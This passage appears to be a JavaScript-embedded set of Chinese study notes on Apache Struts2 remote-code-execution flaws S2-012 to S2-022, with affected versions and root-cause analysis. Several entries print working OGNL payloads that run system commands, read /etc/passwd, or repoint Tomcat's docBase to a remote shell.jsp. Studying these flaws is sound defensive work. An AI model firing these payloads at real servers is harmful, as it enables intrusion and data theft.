                            1\u3001\u5728S2-003\u548CS2-005\u4E2D\u5DF2\u7ECF\u89E3\u51B3\u4E86\u7C7B\u4F3C\u7684\u884C\u4E3A\uFF0C\u4F46\u4E8B\u5B9E\u8BC1\u660E\uFF0C\u57FA\u4E8E\u5217\u5165\u53EF\u63A5\u53D7\u7684\u53C2\u6570\u540D\u79F0\u7684\u7ED3\u679C\u4FEE\u590D\u4EC5\u90E8\u5206\u5730\u5173\u95ED\u4E86\u8BE5\u6F0F\u6D1E\u3002
                            2\u3001ParametersInterceptor\u4E2D\u7684\u6B63\u5219\u8868\u8FBE\u5F0F\u5C06top ['foo']\uFF080\uFF09\u4F5C\u4E3A\u6709\u6548\u7684\u8868\u8FBE\u5F0F\u5339\u914D\uFF0C
                                    1\u3001OGNL\u5C06\u5176\u4F5C\u4E3A\uFF08top ['foo']\uFF09\uFF080\uFF09\u5904\u7406\uFF0C\u5E76\u5C06\u201Cfoo\u201D\u64CD\u4F5C\u53C2\u6570\u7684\u503C\u4F5C\u4E3AOGNL\u8868\u8FBE\u5F0F\u6C42\u503C\u3002
                                            1\u3001\u8FD9\u4F7F\u5F97\u6076\u610F\u7528\u6237\u5C06\u4EFB\u610F\u7684OGNL\u8BED\u53E5\u653E\u5165\u7531\u64CD\u4F5C\u516C\u5F00\u7684\u4EFB\u4F55String\u53D8\u91CF\u4E2D\uFF0C\u5E76\u5C06\u5176\u8BC4\u4F30\u4E3AOGNL\u8868\u8FBE\u5F0F\uFF0C
                                                    1\u3001\u5E76\u4E14\u7531\u4E8EOGNL\u8BED\u53E5\u5728HTTP\u53C2\u6570\u4E2D \u2014\u2014\u2014\u2014\u2014\u2014 \u653B\u51FB\u8005\u53EF\u4EE5\u4F7F\u7528\u9ED1\u540D\u5355\u5B57\u7B26\uFF08\u4F8B\u5982\uFF03\uFF09\u7981\u7528\u65B9\u6CD5\u6267\u884C\u5E76\u6267\u884C\u4EFB\u610F\u65B9\u6CD5\uFF0C\u7ED5\u8FC7ParametersInterceptor\u548COGNL\u5E93\u4FDD\u62A4\u3002

          \u6F0F\u6D1E\u5229\u7528

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-012 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2013-1965\uFF09",`

  S2-012 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2013-1965\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  2.1.0 - 2.3.13
          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                  1\u3001\u5982\u679C\u5728\u914D\u7F6E Action \u4E2D Result \u65F6\u4F7F\u7528\u4E86\u91CD\u5B9A\u5411\u7C7B\u578B\uFF0C\u5E76\u4E14\u8FD8\u4F7F\u7528 \${param_name} \u4F5C\u4E3A\u91CD\u5B9A\u5411\u53D8\u91CF
                          1\u3001\u4EE3\u7801\u793A\u4F8B\uFF1A
                                  // xml\u6587\u4EF6
                                  <package name="S2-012" extends="struts-default">
                                      <action name="user" class="com.demo.action.UserAction">
                                          <result name="redirect" type="redirect">/index.jsp?name=\${name}</result>
                                          <result name="input">/index.jsp</result>
                                          <result name="success">/index.jsp</result>
                                      </action>
                                  </package>
                          2\u3001\u8FD9\u91CC UserAction \u4E2D\u5B9A\u4E49\u6709\u4E00\u4E2A name \u53D8\u91CF\uFF0C
                                  1\u3001\u5F53\u89E6\u53D1 redirect \u7C7B\u578B\u8FD4\u56DE\u65F6\uFF0CStruts2 \u83B7\u53D6\u4F7F\u7528 \${name} \u83B7\u53D6\u5176\u503C\uFF0C
                                          1\u3001\u5728\u8FD9\u4E2A\u8FC7\u7A0B\u4E2D\u4F1A\u5BF9 name \u53C2\u6570\u7684\u503C\u6267\u884C OGNL \u8868\u8FBE\u5F0F\u89E3\u6790\uFF0C\u4ECE\u800C\u53EF\u4EE5\u63D2\u5165\u4EFB\u610F OGNL \u8868\u8FBE\u5F0F\u5BFC\u81F4\u547D\u4EE4\u6267\u884C\u3002


          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          %3d%25{%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"cat"%2c "%2fetc%2fpasswd"})).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew java.io.InputStreamReader(%23b)%2c%23d%3dnew java.io.BufferedReader(%23c)%2c%23e%3dnew char[50000]%2c%23d.read(%23e)%2c%23f%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")%2c%23f.getWriter().println(new java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()}%20

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-013 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2013-1966\uFF09",`

  S2-013 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2013-1966\uFF09

          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  2.0.0 - 2.3.14

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                  1\u3001struts2\u7684\u6807\u7B7E\u4E2D<s:a>\u548C<s:url>\u90FD\u6709\u4E00\u4E2A includeParams \u5C5E\u6027\uFF0C\u53EF\u4EE5\u8BBE\u7F6E\u6210\u5982\u4E0B\u503C
                          none- URL\u4E2D\u4E0D\u5305\u542B\u4EFB\u4F55\u53C2\u6570\uFF08\u9ED8\u8BA4\uFF09
                          get- \u4EC5\u5305\u542BURL\u4E2D\u7684GET\u53C2\u6570
                          all- \u5728URL\u4E2D\u5305\u542BGET\u548CPOST\u53C2\u6570
                  2\u3001\u5F53 includeParams=all \uFF08\u6709\u65F6\u5019get\u4E5F\u53EF\u4EE5\uFF09  \u7684\u65F6\u5019\uFF0C\u4F1A\u5C06\u672C\u6B21\u8BF7\u6C42\u7684GET\u548CPOST\u53C2\u6570\u90FD\u653E\u5728URL\u7684GET\u53C2\u6570\u4E0A\u3002
                          1\u3001\u6B64\u65F6<s:a>\u6216<s:url>\u5C1D\u8BD5\u53BB\u89E3\u6790\u539F\u59CB\u8BF7\u6C42\u53C2\u6570\u65F6\uFF0C\u4F1A\u5BFC\u81F4OGNL\u8868\u8FBE\u5F0F\u7684\u6267\u884C

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          \uFF08\u5907\u6CE8\uFF1APoC\u4E2D\u7684\u7B26\u53F7\uFF0C\u9700\u8981\u8FDB\u884C url \u7F16\u7801\u4E4B\u540E\u624D\u53EF\u4EE5\uFF09
                          \u7B2C\u4E00\u79CD\uFF1A
                                  /link.action?fakeParam=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
                          \u7B2C\u4E8C\u79CD\uFF1A
                                  \${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')}

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-014 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-014 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              Struts 2.0.0 - Struts 2.3.14.1

      \u5229\u7528\u6761\u4EF6

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001S2-014 \u662F\u5BF9 S2-013 \u4FEE\u590D\u4E0D\u8DB3\u7684\u7ED5\u8FC7\u3002

      \u539F\u7406\u5206\u6790
              1\u3001\u7531\u4E8E UrlHelper#translateVariable() \u65B9\u6CD5\u8C03\u7528\u7684\u662F\u53EA\u6709\u4E24\u4E2A\u53C2\u6570\u7684 TextParseUtil.translateVariables() \u65B9\u6CD5\u3002
                      xxxxxx
              2\u3001\u8FD9\u4E2A\u65B9\u6CD5\u6307\u5B9A openChars \u53EF\u4EE5\u4E3A \u300A $\u300B \u3001 \u300A % \u300B \uFF0C\u6240\u4EE5\u53EF\u4EE5\u9664\u4E86\u4F7F\u7528 \u300A %{} \u300B \uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528 \u300A \${} \u300B \u5305\u88F9\u8868\u8FBE\u5F0F\u3002

      \u6F0F\u6D1E\u5229\u7528
              1\u3001Payload\u5982\u4E0B\uFF1A
                      \uFF08\u5907\u6CE8\uFF1APoC\u4E2D\u7684\u7B26\u53F7\uFF0C\u9700\u8981\u8FDB\u884C url \u7F16\u7801\u4E4B\u540E\u624D\u53EF\u4EE5\uFF09
                      \${#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-015 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2013-2135\u3001CVE-2013-2134\uFF09",`

  S2-015 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2013-2135\u3001CVE-2013-2134\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 - 2.3.14.2

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001Apache Struts 2.0.0\u81F32.3.14.2\u7248\u672C\u4E2D\u5B58\u5728\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002
                          1\u3001\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u501F\u52A9\u5E26\u6709 \u300A\${}\u300B \u548C \u300A%{}\u300B \u5E8F\u5217\u503C\uFF08\u53EF\u5BFC\u81F4\u5224\u65ADOGNL\u4EE3\u7801\u4E24\u6B21\uFF09\u7684\u8BF7\u6C42\uFF0C\u5229\u7528\u8BE5\u6F0F\u6D1E\u6267\u884C\u4EFB\u610FOGNL\u4EE3\u7801\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u5982\u679C\u4E00\u4E2A\u8BF7\u6C42\u4E0E\u4EFB\u4F55\u5176\u4ED6\u5B9A\u4E49\u7684\u64CD\u4F5C\u4E0D\u5339\u914D\uFF0C\u5B83\u5C06\u88AB\u5339\u914D \u300A*\u300B\uFF0C\u5E76\u4E14\u6240\u8BF7\u6C42\u7684\u64CD\u4F5C\u540D\u79F0 \u5C06\u7528\u4E8E\u4EE5 \u64CD\u4F5C\u540D\u79F0 \u52A0\u8F7DJSP\u6587\u4EF6\u3002
                          1\u3001\u4E3E\u4F8B\u5982\u4E0B\uFF1A
                                  <action name="*" class="example.ExampleSupport">
                                      <result>/example/{1}.jsp</result>
                                  </action>
                  2\u3001\u5E76\u4E14\uFF0C\u300A\${}\u300B \u548C \u300A%{}\u300B \u5E8F\u5217\u503C\uFF0C\u4F5C\u4E3AOGNL\u8868\u8FBE\u5F0F\u7684\u5A01\u80C1\u503C\uFF0C\u53EF\u4EE5\u5728\u670D\u52A1\u5668\u7AEF\u6267\u884C\u4EFB\u610F\u7684Java\u4EE3\u7801\u3002
                  3\u3001\u8FD9\u4E2A\u6F0F\u6D1E\u662F\u4E24\u4E2A\u95EE\u9898\u7684\u7EC4\u5408\uFF1A
                          1\u3001\u8BF7\u6C42\u7684\u64CD\u4F5C\u540D\u79F0\u672A\u88AB\u8F6C\u4E49\u6216\u518D\u6B21\u68C0\u67E5\u767D\u540D\u5355
                          1\u3001\u5728 \u300ATextParseUtil.translateVariables\u300B \u4F7F\u7528\u7EC4\u5408 \u300A$\u300B \u548C \u300A%\u300B \u5F00\u653E\u5B57\u7B26\u65F6\uFF0C\u5BF9OGNL\u8868\u8FBE\u5F0F\u8FDB\u884C\u53CC\u91CD\u5224\u65AD\u3002

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          /$%7B%20%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls').getInputStream())%7D.action

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-016 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-016 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 \u2013 2.3.15

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u5728struts2\u4E2D\uFF0CDefaultActionMapper\u7C7B\u652F\u6301\u4EE5"action:"\u3001\u201Credirect:\u201D\u3001"redirectAction:"\u4F5C\u4E3A\u5BFC\u822A\u6216\u662F\u91CD\u5B9A\u5411\u524D\u7F00\uFF0C
                          1\u3001\u4F46\u662F\u8FD9\u4E9B\u524D\u7F00\u540E\u9762\u540C\u65F6\u53EF\u4EE5\u8DDFOGNL\u8868\u8FBE\u5F0F\uFF0C
                          2\u3001\u7531\u4E8Estruts2\u6CA1\u6709\u5BF9\u8FD9\u4E9B\u524D\u7F00\u505A\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u5229\u7528OGNL\u8868\u8FBE\u5F0F\u8C03\u7528java\u9759\u6001\u65B9\u6CD5\u6267\u884C\u4EFB\u610F\u7CFB\u7EDF\u547D\u4EE4\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u7ECF org.apache.struts2.dispatcher.FilterDispatcher \u7684 doFilter \u65B9\u6CD5\u62E6\u622A\u7528\u6237\u8BF7\u6C42\uFF0C doFilter \u521B\u5EFA\u503C\u6808\u3001\u4E0A\u4E0B\u6587\u3001\u5305\u88C5request\u7B49\u4E00\u4E9B\u521D\u59CB\u5316\u64CD\u4F5C\uFF0C
                          1\u3001\u7136\u540E\u8FDB\u5165 DefaultActionMapper \u7684 getMapping() \u65B9\u6CD5\u3002
                          2\u3001\u901A\u8FC7uri\u89E3\u6790\u5BF9\u5E94 action\u7684namespace\u3001actionname \u7B49\u914D\u7F6E\u4FE1\u606F\u3002\u518D\u8FDB\u5165 handleSpecialParameters \u65B9\u6CD5\u5904\u7406\u8BF7\u6C42\u53C2\u6570\u3002
                          3\u3001\u5728handleSpecialParameters \u4E2D\u901A\u8FC7 parameterAction.execute(key, mapping); \u8FDB\u5165 DefaultActionMapper \u5904\u7406\u76F8\u5E94\u903B\u8F91\u3002
                          4\u3001redirect.setLocation(key.substring("redirect:".length())); \u5C06\u8BF7\u6C42\u53C2\u6570 \u300A redirect: \u300B \u540E\u7684\u5185\u5BB9\u8BBE\u7F6E\u4E3A location ,
                                  1\u3001\u6B64\u65F6key\u503C\u4E3A \u300A redirect:ognl \u300B \u8868\u8FBE\u5F0F\uFF0C\u5373 ognl\u8868\u8FBE\u5F0F \u88AB\u8BBE\u7F6E\u4E3A location \uFF0C
                                  2\u3001\u7136\u540E\u5C06\u8BE5 ServletRedirectResult \u7C7B\u578B\u4E14 location \u4E3A ognl\u8868\u8FBE\u5F0F \u7684 redirect\u5BF9\u8C61 \uFF0C\u8BBE\u7F6E\u4E3A\u8BE5mapping\u7684Result\u3002
                                  2\u3001\u7136\u540E\u5173\u6CE8 location \u7684\u503C\u662F\u5982\u4F55\u88AB\u6267\u884C\u7684\u3002 \u903B\u8F91\u56DE\u5230FilterDispatcher\u7684doFilter\u65B9\u6CD5\uFF0C\u901A\u8FC7this.dispatcher.serviceAction\u8FDB\u5165Dispatcher\u7684serviceAction\u65B9\u6CD5\u7EE7\u7EED\u3002
                          5\u3001\u901A\u8FC7 mapping.getResult(); \u83B7\u53D6\u8BE5 mapping \u7684 result \u5BF9\u8C61\uFF0C\u4E5F\u5C31\u662F\u4E0A\u9762\u7684ServletRedirectResult\u7C7B\u578B\u4E14location\u4E3Aognl\u8868\u8FBE\u5F0F\u7684redirect\u5BF9\u8C61\u3002
                                  1\u3001\u8FDB\u5165ServletRedirectResult\u7684execute\u65B9\u6CD5\uFF0C\u4E00\u76F4\u8DDF\u8E2A\u5230org.apache.struts2.dispatcher.StrutsResultSupport\u7684execute\u65B9\u6CD5\u3002
                                  2\u3001\u53EF\u89C1\u901A\u8FC7conditionalParse()\u65B9\u6CD5\u5904\u7406location\uFF0C\u6700\u540E\u7ECFTextParseUtil.translateVariables()\u5904\u7406\uFF0C\u4ECE\u800C\u6267\u884Clocation\u4E2D\u7684ognl\u8868\u8FBE\u5F0F\u3002

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-018 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-018 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 - Struts 2.3.15.2

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u9488\u5BF9 action: \u524D\u7F00\u5F15\u53D1\u7684\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u4F7F\u7528\u7CBE\u5FC3\u6784\u9020\u7684action: \u53EF\u4EE5\u7ED5\u8FC7\u8BBF\u95EE\u63A7\u5236\u9650\u5236\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u4E0E\u4F7F\u7528 action: \u524D\u7F00\u8DE8\u547D\u540D\u7A7A\u95F4\u8C03\u7528\u76F8\u5173

          \u6F0F\u6D1E\u5229\u7528

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-019 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-019 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 - 2.3.15.1

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001Struts 2.3.15.2 \u4E4B\u524D\u7248\u672C \u7684 \u300ADynamic Method Invocation\u300B \u673A\u5236\uFF0C\u662F\u9ED8\u8BA4\u5F00\u542F\u7684\u3002
                          1\u3001\u4EC5\u63D0\u9192\u7528\u6237\u5982\u679C\u53EF\u80FD\u7684\u60C5\u51B5\u4E0B\u5173\u95ED\u6B64\u673A\u5236\uFF0C
                          2\u3001\u8FD9\u6837\u5C31\u5B58\u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C
                                  \u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u5229\u7528\u6B64\u6F0F\u6D1E\u5728\u53D7\u5F71\u54CD\u5E94\u7528\u4E0A\u4E0B\u6587\u4E2D\u6267\u884C\u4EFB\u610F\u4EE3\u7801\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u8981\u6C42\u5F00\u53D1\u8005\u6A21\u5F0F\uFF0C\u4E14poc\u7B2C\u4E00\u4E2A\u53C2\u6570\u662Fdebug\uFF0C\u89E6\u53D1\u70B9\u5728DebuggingInterceptor\u4E0A\uFF0C
                          1\u3001\u67E5\u770Bintercept\u51FD\u6570\uFF0C\u4ECEdebug\u53C2\u6570\u83B7\u53D6\u8C03\u8BD5\u6A21\u5F0F\uFF0C
                                  1\u3001\u5982\u679C\u6A21\u5F0F\u662Fcommand\uFF0C\u5219\u628Aexpression\u53C2\u6570\u653E\u5230stack.findValue\u4E2D\uFF0C\u6700\u7EC8\u653E\u5230\u4E86ognl.getValue\u4E2D\u3002

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          /struts2-showcase-2.1.6/showcase.action?debug=command&expression=%23a%3D(new java.lang.ProcessBuilder('ls')).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew java.io.InputStreamReader(%23b)%2C%23d%3Dnew java.io.BufferedReader(%23c)%2C%23e%3Dnew char[50000]%2C%23d.read(%23e)%2C%23out%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23out.getWriter().println('dbapp%3A'%2bnew java.lang.String(%23e))%2C%23out.getWriter().flush()%2C%23out.getWriter().close()%0A

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-020/S2-021/S2-022",`

  S2-020/S2-021/S2-022\uFF0C\u7CFB\u5217\u6F0F\u6D1E

          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 - Struts 2.3.16.1\u3001Struts 2.0.0 - Struts 2.3.16.3

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001S2-020 \u4FEE\u590D\u4E86\u4E00\u4E2A DOS\uFF08\u62D2\u7EDD\u670D\u52A1\u653B\u51FB\u6F0F\u6D1E\uFF09\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u5728 ParametersInterceptor \u4E2D\uFF0CStruts2 \u5BF9\u53C2\u6570\u540D\u6821\u9A8C\u7684\u6B63\u5219\u4E3A\uFF1A
                          1\u3001\u8BED\u53E5\u4E3A\uFF1A
                                  \\w+((\\.\\w+)|(\\[\\d+\\])|(\\(\\d+\\))|(\\['\\w+'\\])|(\\('\\w+'\\)))*
                          2\u3001\u8FD9\u6837\u7684\u6B63\u5219\uFF0C\u5176\u5B9E\u4E0A\u8FD8\u662F\u53EF\u4EE5\u5728\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u4FEE\u6539 context \u53CA root \u4E2D\u7684\u5185\u5BB9
                                  \u6BD4\u5982\uFF1A    localhost:8080/test.action?messasge=aaaaa&top%5B%27message%27%5D=bbbbbb
                                          \u8FD4\u56DE\u503C\u4E3A bbbbbb \uFF0C \u800C\u4E0D\u662F aaaaaa
                          3\u3001\u800C\u4E14\u8FD9\u4E2A\u6B63\u5219\u5141\u8BB8 a.b.c.d.e \u7684\u53C2\u6570\u5F62\u5F0F\u3002
                                  1\u3001\u8FD9\u79CD\u5F62\u5F0F\u80FD\u9020\u6210\u4EC0\u4E48\u5371\u5BB3\u5462\uFF1F
                                          1\u3001\u5728 OGNL \u4E2D\uFF0C\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u53D8\u91CF\u540D\u8BBF\u95EE root \u5BF9\u8C61\u4E2D\u7684\u5185\u5BB9\uFF0C\u662F\u56E0\u4E3A\u7A0B\u5E8F\u4F1A\u5728 root \u5BF9\u8C61\u4E2D\u5C1D\u8BD5\u5BFB\u627E\u5BF9\u5E94\u7684\u53D8\u91CF\u4EE5\u53CA get/set/is \u65B9\u6CD5\uFF1A
                          4\u3001\u56E0\u6B64\uFF0C\u6211\u4EEC\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528 class \u5173\u952E\u5B57\u83B7\u53D6 root \u7684 Class \u5BF9\u8C61\uFF0C\u56E0\u4E3A\u4F1A\u8C03\u7528 getClass() \u65B9\u6CD5\uFF0C
                                  \u8FD9\u4E2A\u65B9\u6CD5\u6BCF\u4E2A\u7C7B\u90FD\u6709\uFF0C\u5E76\u53EF\u4EE5\u901A\u8FC7\u8FD9\u4E2A\u65B9\u6CD5\u8BBF\u95EE\u5176 ClassLoader \u5BF9\u8C61\u7B49\u7B49\uFF0C\u5982\u4E0B\uFF1A
                                          xxxxxx
                          5\u3001\u5728 struts2 \u4E2D\uFF0C root \u5BF9\u8C61\u662F\u5F53\u6B21\u8BBF\u95EE\u7684 Action \u5BF9\u8C61\uFF0C\u800C\u5176 ClassLoader \u901A\u5E38\u7531\u8FD0\u884C\u73AF\u5883\u6240\u63D0\u4F9B\uFF0C
                                  1\u3001\u4F8B\u5982\u5728 Tomcat \u4E0B\uFF0C\u8FD9\u4E2A ClassLoader \u5E94\u8BE5\u4E3A\u5F53\u524D\u5E94\u7528\u6240\u4F7F\u7528\u7684\uFF1Aorg.apache.catalina.loader.WebappClassLoader\u3002
                                  2\u3001\u5728\u8FD9\u4E2A ClassLoader \u4E2D\uFF0C\u5B58\u653E\u4E86\u5F88\u591A\u5728\u5BB9\u5668\u8FD0\u884C\u65F6\uFF0C\u4E0A\u4E0B\u6587\u4E2D\u7684\u6240\u9700\u8981\u7684\u4E00\u4E9B\u503C\uFF0C\u5982\u679C\u8FD9\u4E9B\u503C\u88AB\u4FEE\u6539\u4E86\uFF0C\u53EF\u80FD\u4F1A\u5F71\u54CD\u5230\u5E94\u7528\u7A0B\u5E8F\u7684\u8FD0\u884C\u65B9\u5F0F\u3002
                          6\u3001\u80FD\u88AB\u6211\u4EEC\u4FEE\u6539\u7684\u5C5E\u6027\u9700\u8981\u6709\u4EE5\u4E0B\u51E0\u4E2A\u6761\u4EF6\uFF1A
                                  1\u3001\u6709 set \u65B9\u6CD5\uFF0C\u6216\u8005\u662F\u53EF\u4EE5\u4F7F\u7528 set \u65B9\u6CD5\u6539\u53D8\u7684\u503C\uFF1B
                                  2\u3001\u4FEE\u9970\u7B26\u5E94\u8BE5\u662F public\uFF1B
                                  3\u3001\u5C5E\u6027\u7684\u8FD4\u56DE\u503C\u5E94\u8BE5\u662F\u901A\u8FC7\u7528\u6237\u7684\u8F93\u5165\u53EF\u4EE5\u88AB OGNL \u89E3\u6790\u6210\u4E3A\u76F8\u5E94\u7684\u5BF9\u8C61\uFF1B
                                  4\u3001\u4FEE\u6539\u540E\u80FD\u591F\u5BF9\u5E94\u7528\u7A0B\u5E8F\u9020\u6210\u5F71\u54CD\uFF0C\u5BFC\u81F4\u5B89\u5168\u98CE\u9669\u3002
                          7\u3001\u4F8B\u5982\u8BBF\u95EE\uFF1Ahttp://localhost:8080/test.action?class.classLoader.resources.dirContext.docBase=/Users/phoebe/Downloads
                                  1\u3001\u6B64\u65F6 Tomcat \u7684\u6587\u6863\u8DEF\u5F84\u5C06\u4F1A\u6539\u4E3A\u6211\u4EEC\u4F20\u5165\u7684\u6307\u5B9A\u8DEF\u5F84\uFF0C\u53EF\u4EE5\u8BBF\u95EE\u5176\u4E2D\u7684\u5185\u5BB9\uFF1A
                                          xxxxxx
                          8\u3001\u7531\u4E8E\u6839\u636E\u73AF\u5883\u4E0D\u540C\uFF0Cclass.classLoader \u5BF9\u5E94\u7684\u7ED3\u679C\u662F\u4E0D\u540C\u7684\uFF0C\u56E0\u6B64\u8FD9\u4E2A\u6F0F\u6D1E\u7684\u5229\u7528\u4E0D\u662F\u7279\u522B\u7684\u5177\u6709\u901A\u7528\u6027\uFF0C
                                  \u5728\u6B64\u91CC\uFF0C\u4E5F\u53EA\u9488\u5BF9 Tomcat \u8FDB\u884C\u7814\u7A76\u548C\u6D4B\u8BD5\u3002
                  2\u3001\u5229\u7528\u8FD9\u4E2A\u65B9\u5F0F\uFF0C\u76EE\u524D\u5728\u4E92\u8054\u7F51\u4E0A\u51FA\u73B0\u4E86\u4E00\u4E9B Tomcat \u6216\u5176\u4ED6\u4E2D\u95F4\u4EF6\u7684 RCE \u7684\u5229\u7528\u65B9\u5F0F\uFF1A
                          1\u3001Tomcat \u5E94\u7528\u76EE\u5F55\u66F4\u6539\u4E3A\u6076\u610F UNC \u8DEF\u5F84\uFF1A
                                  \u6BD4\u5982\uFF1A    class.classLoader.resources.dirContext.docBase=\\\\192.168.1.1\\shell.jsp
                          2\u3001\u4FEE\u6539\u65E5\u5FD7\u8BB0\u5F55\u6587\u4EF6\u4F4D\u7F6E\u3001\u6587\u4EF6\u540D\u3001\u6587\u4EF6\u540E\u7F00\uFF0C\u901A\u8FC7\u8BBF\u95EE\u65F6\u5E26\u5165\u6076\u610F jsp \u4EE3\u7801\uFF0C\u5C06\u65E5\u5FD7\u6587\u4EF6\u540E\u7F00\u4FEE\u6539\u4E3A jsp\uFF0C
                                  \u8FD9\u6837\u8BBF\u95EE\u65F6\u7A0B\u5E8F\u4F1A\u4EE5 jsp \u4EE3\u7801\u8FDB\u884C\u89E3\u6790\uFF0C\u6267\u884C\u6076\u610F\u6587\u4EF6\u3002
                  3\u3001\u4E00\u4E9B\u4FEE\u590D\u548C\u7ED5\u8FC7\uFF1A
